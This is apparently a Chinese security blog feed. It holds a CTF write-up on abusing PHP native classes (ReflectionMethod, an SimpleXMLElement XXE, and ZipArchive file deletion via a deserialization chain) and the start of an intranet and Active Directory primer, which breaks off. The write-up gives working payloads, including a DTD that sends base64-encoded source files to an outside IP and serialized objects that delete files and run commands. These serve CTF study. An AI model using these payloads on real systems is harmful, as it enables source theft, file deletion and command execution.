ReflectionFunctionAbstract implements Reflector &#123;/* 常量 */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* 属性 */public $name ;public $class ;/* 方法 */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* 继承的方法 */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="第十四届全国信息安全竞赛-easy-resource"><a href="#第十四届全国信息安全竞赛-easy-resource" class="headerlink" title="[第十四届全国信息安全竞赛]easy_resource"></a>[第十四届全国信息安全竞赛]easy_resource</h2><p><strong>目录扫描可获得源码:</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>可利用原生的反射类进行读取，题目说在看不到的地方，猜测是在注释的地方<br>可构造payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>翻译一下就是:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocComment获取文档注释</code></pre><p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="image.png"></p><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p><h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="t01f512315ecae4f8e3.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="t017279b3b019174cb6.png"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="image.png"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p> <img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="image.png"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>在vps上放上这两个文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="image.png"><br>然后再使用vps监听5555端口<br>最终构造payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>我们可以看到接受到了数据，base64解码即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="image.png"><br>同理可获得其他页面源码</p><h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>：将文件添加到指定zip压缩包中</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>：添加新的文件同时将内容添加进去</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>：关闭ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>：将压缩包解压</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>：打开一个zip压缩包</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>：删除压缩包中的某一个文件名称，同时也将文件删除</li><li>……</li></ul><p>我们来重点看看 ZipArchive::open 方法：</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p><ul><li>filename：要打开的ZIP存档的文件名。</li><li>flags：用于打开档案的模式。有以下几种模式： <ul><li>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li>ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</li><li>ZipArchive::RDONLY：只读模式打开压缩包。</li><li>ZipArchive::EXCL：如果压缩包已经存在，则出错。</li><li>ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul></li></ul><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。<br>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>源码下载:<a href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="image.png"><br>这里反序列化前有个校验，直接使用数组绕过</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>读取下shell.php的内容<br>构造payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>解码得到shell.php的源码:</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="image.png"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="image.png"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="image.png"><br>传入8相当于重写文件<br>最终构造poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="image.png"><br>接下来构造poc执行命令即可:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="image.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;查看各方法内置类&quot;&gt;&lt;a href=&quot;#查看各方法内置类&quot; class=&quot;headerlink&quot; title=&quot;查看各方法内置类&quot;&gt;&lt;/a&gt;查看各方法内置类&lt;/h1&gt;&lt;p&gt; 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  &lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>内网学习篇</title>
    <link href="https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</id>
    <published>2022-07-13T06:56:01.000Z</published>
    <updated>2022-07-14T00:55:13.117Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="内网安全第一章"><a href="#内网安全第一章" class="headerlink" title="内网安全第一章"></a>内网安全第一章</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><p><strong>工作组</strong>:工作组（ Work Group)，在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居)”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能(或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>域</strong>(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。<br><strong>域控制器</strong>（Domain Controller，简写为Dc）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>域的分类:</strong></p><p><strong>单域</strong><br>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。·一般在一个域内要建立至少两个域服务器，一个作为Dc，一个是备份DC。如果没有第二个备份Dc，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息)是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的Dc恢复了就行了。</p><p><strong>父域</strong></p><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。<br>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。<br>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。(因为在同一个域内，信息交互的条目是很多的，而且不压缩;而在域和域之间，信息交互的条目相对较少，而且压缩。）<br>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略(包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><p><strong>域树</strong></p><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。<br>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>域森林</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNS域名服务器</strong>是进行域名(domain name)和与之相对应的IP地址(IPaddress)转换的服务器。<br>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。<br>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><p><strong>活动目录</strong>（Active Directory）是域环境中提供目录服务的组件。目录是什么?目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。<br>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p><p><strong>逻辑结构</strong></p><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。<br>活动目录的逻辑结构就包括上面讲到的组织单元（ou)、域(domain)、域树( tree)、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>活动目录主要功能</strong></p><p>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。<br>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。<br>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。<br>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。更可靠，更少的宕机时间。如:利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间 少。活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</p><p><strong>AD和DC区别</strong></p><p>如果网络规模较大，我们就会考虑把网络中的众多对象:计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。那么我们应该把这个数据库放在哪台计算机上呢?规定是这样的，我们把存放有活动目录数据库的计算机就称为Dc。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><p><strong>安全域的划分</strong></p><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL(网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域;允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><strong>DMZ</strong></p><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMz区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZ屏障功能</strong></p><p>(1) 内网可以访问外网<br>内网的角户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p><p>(2) 内网可以访问DMZ<br>此策略使内网用户可以使用或者管理DMZ中的服务器。</p><p>(3) 外网不能访问内网<br>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果耍访问，就要通过VPN方式来进行。</p><p>(4) 外网可以访问DMZ<br>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p><p>(5) 